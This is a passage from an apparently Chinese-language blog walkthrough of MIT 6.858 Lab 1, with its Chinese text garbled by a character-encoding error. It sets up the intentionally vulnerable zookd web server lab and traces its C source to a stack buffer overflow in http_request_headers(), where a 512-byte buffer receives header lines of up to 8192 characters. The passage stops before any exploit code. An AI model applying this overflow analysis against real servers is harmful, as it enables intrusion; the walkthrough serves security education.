zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½åœ¨æœ¬åœ°çš„ 8080 ç«¯å£è®¿é—®åˆ° zookdï¼Œç›´æ¥è¿›å»å¤§æ¦‚ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"><a href="#Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ" class="headerlink" title="Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ"></a>Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ</h3><p>é¦–å…ˆæ˜¯é…ç¯å¢ƒï¼Œé™¤äº† <code>pwntools</code> æ˜¯ç¬”è€…ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€ä¸ªç¼–å†™ exp çš„æ¨¡å—ä»¥å¤–å…¶ä»–éƒ½æ˜¯å®éªŒç¯å¢ƒå¿…é¡»çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ"><a href="#Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ" class="headerlink" title="Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ"></a>Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ</h3><p>å› ä¸ºè¯„æµ‹ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦ç”¨è¾ƒé«˜ç‰ˆæœ¬çš„ libcï¼ˆä¾‹å¦‚ç¬”è€…ç”¨çš„å°±æ˜¯ Ubuntu 20.04 with è¿‡æ—¶çš„ libc2.31ï¼‰ï¼ŒåŒæ—¶ä¹Ÿé¿å…æ±¡æŸ“æœ¬åœ°ç¯å¢ƒï¼Œå› æ­¤ä½¿ç”¨ Docker æ¥å®Œæˆå®éªŒä¹Ÿæ˜¯ä¸€ä¸ªéœ€æ±‚é¡¹</p><blockquote><p>Dockerfileï¼Œæ³¨æ„æ›¿æ¢ä¸Šè‡ªå·±çš„å…¬é’¥ï¼Œå¦‚æœæ²¡æœ‰ä»å¤–éƒ¨è¿æ¥å®¹å™¨çš„éœ€æ±‚çš„è¯è¿™ä¸€æ­¥å¯ä»¥è·³è¿‡</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;è¿™é‡Œå†™ä½ çš„sshå…¬é’¥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºå®éªŒè¦å…³ ASLR æ‰€ä»¥æˆ‘ä»¬åœ¨å¯åŠ¨ docker æ—¶éœ€è¦ <code>--privileged</code>ï¼Œä¸è¿‡å› ä¸ºåªæ˜¯å®éªŒç”¨çš„å®¹å™¨æ‰€ä»¥æ— æ‰€è°“ï¼ŒåŒæ—¶ä¸ºäº†å¤–ç½‘èƒ½è®¿é—®åˆ°æ‰€ä»¥è¿™é‡Œé…äº†å‡ ä¸ªç«¯å£è½¬å‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½ç›´æ¥è¿›åˆ°å®¹å™¨å†…éƒ¨ç»§ç»­å®éªŒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-è¿æ¥"><a href="#EXTRA-vscode-è¿æ¥" class="headerlink" title="EXTRA.vscode è¿æ¥"></a>EXTRA.vscode è¿æ¥</h3><p>å› ä¸ºæˆ‘ä»¬çš„å®éªŒç¯å¢ƒéƒ½æœ‰ sshï¼Œæ‰€ä»¥ç›´æ¥ç”¨ vscode é€šè¿‡ ssh è¿æ¥æ˜¯éå¸¸æ–¹ä¾¿çš„ä¸€ä»¶äº‹æƒ…ï¼ˆå®¹å™¨é…ä¸Šç«¯å£è½¬å‘ä¹Ÿå¯ä»¥è¿æ¥ï¼‰</p><p> é¦–å…ˆåœ¨æ‰©å±•é‡Œæ‰¾åˆ° ssh æ’ä»¶å¹¶å®‰è£…</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>æ·»åŠ  host ä¿¡æ¯</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>ä¹‹åç›´æ¥è¿æ¥ä¸Šå»å°±è¡Œäº†</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1 id="0x01-Lab1-Buffer-overflows"><a href="#0x01-Lab1-Buffer-overflows" class="headerlink" title="0x01. Lab1: Buffer overflows"></a>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows"><a href="#Part-1-Finding-buffer-overflows" class="headerlink" title="Part 1: Finding buffer overflows"></a>Part 1: Finding buffer overflows</h2><p>é¦–å…ˆç»™äº†ä¸€ä¸ªèµ„æ–™ï¼š<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>ï¼ŒåŸºç¡€è–„å¼±çš„åŒå­¦å¯ä»¥ä»”ç»†çœ‹çœ‹ï¼Œç¬”è€…è¿™é‡Œç›´æ¥è·³è¿‡ï¼Œç„¶åæ˜¯ Exercise 1ï¼š</p><blockquote><p><strong>Exercise 1.</strong> Study the web serverâ€™s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>å¤§æ¦‚æ˜¯é˜…è¯»  <code>zookd.c</code> å’Œ <code>http.c</code> æ‰¾æ¼æ´ï¼Œæç¤ºå…³æ³¨åœ¨æ ˆä¸Šåˆ†é…çš„ bufferï¼Œå¹¶å°†ç­”æ¡ˆå†™åœ¨ <code>answers.txt</code> ä¸­<del>ï¼ˆğŸ‘´ï¼šâ“ï¼‰</del></p><p>é¦–å…ˆçœ‹ <code>zookd.c</code>ï¼Œæºç æ¯”è¾ƒç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨ <code>run_server()</code> ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ <code>start_server()</code> åˆ›å»ºä¸€ä¸ª http æœåŠ¡å™¨ï¼Œä¹‹ååœ¨ <code>run_server()</code> ä¸­æœ‰ä¸€ä¸ªæ— é™å¾ªç¯è°ƒç”¨ <code>accept()</code> æ¥æ”¶è¯·æ±‚å <code>fork()</code> å‡ºå­è¿›ç¨‹è°ƒç”¨ <code>process_client()</code> å¤„ç†</p><h4 id="process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request"><a href="#process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request" class="headerlink" title="process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request"></a>process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request</h4><p> <code>process_client()</code> çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>http_request_line()</code> è·å–è¯·æ±‚å¤´ç¬¬ä¸€è¡Œï¼Œä¹‹åç»™åˆ° <code>env_deserialize()</code> è§£æç¯å¢ƒå˜é‡ï¼Œä¹‹åè°ƒç”¨ <code>http_request_headers()</code> è§£æå‰©ä¸‹çš„ headerï¼Œæœ€åè°ƒç”¨ <code>http_serve()</code> å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ"><a href="#http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ" class="headerlink" title="http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ"></a>http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ</h4><p>ç°åœ¨æ¥çœ‹ <code>http_request_line()</code>ï¼Œå…¶é¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•° <code>http_read_line()</code> ä» TCP è¿æ¥ä¸­è¯»å–ä¸€æ•´è¡Œï¼ˆread() ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°è¯»ï¼Œä¸€ç›´è¯»åˆ° <code>\n</code> å¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¯¹äº <code>\r</code> è‡ªåŠ¨è·³è¿‡ï¼Œå¤±è´¥åˆ™è¿”å› <code>-1</code>ï¼Œä»£ç å°±ä¸è´´äº†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åè§£æè·¯å¾„ä¸è¯·æ±‚ç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>strchr()</code> è¿›è¡Œåˆ†éš”ååˆ¤æ–­ï¼Œå¹¶å°†ç»“æœå†™åˆ° <code>env</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>ç„¶åè§£æè¯·æ±‚ä¸­çš„å‚æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åè°ƒç”¨ <code>url_decode(dst, src)</code> è§£æ request URLï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯æŠŠ URL é‡Œçš„ <code>%ab</code> æ¢æˆ <code>0xab</code> ï¼ŒæŠŠ <code>+</code> æ¢æˆ ç©ºæ ¼ï¼Œç”± <code>src</code> æ‹·è´åˆ° <code>dst</code> ï¼›æœ€åå°†ç»“æœå†™å› <code>env</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"><a href="#http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰" class="headerlink" title="http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"></a>http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰</h4><p>è¿›æ¥é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šè°ƒç”¨ <code>http_read_line()</code> è¯»å–ä¸€è¡Œ header è¿›è¡Œè§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯è§£æ <code>key: value</code> å‹çš„å€¼ï¼Œé¦–å…ˆæ˜¯ <code>shrchr()</code> æŒ‰ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼Œç„¶åå°† <code>key</code> è½¬æˆå¤§å†™ä¸” <code>-</code> è½¬æˆ <code>_</code> ï¼Œä¹‹åè°ƒç”¨ <code>url_decode()</code> è§£æ</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>value</code> æ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„å­—ç¬¦æ•°ç»„ï¼Œé•¿åº¦ä»…ä¸º 512</strong>ï¼Œè€Œè¯¥ HTTP server æ‰€å…è®¸çš„å•è¡Œæœ€å¤§é•¿åº¦ä¸º 8192 å­—ç¬¦ï¼Œè¿™æ„å‘³ç€<strong>æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°é€šè¿‡ä¼ å…¥ä¸€ä¸ªè¾ƒé•¿çš„é”®å€¼å¯¹å‚æ•°æ¥å®Œæˆæ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span 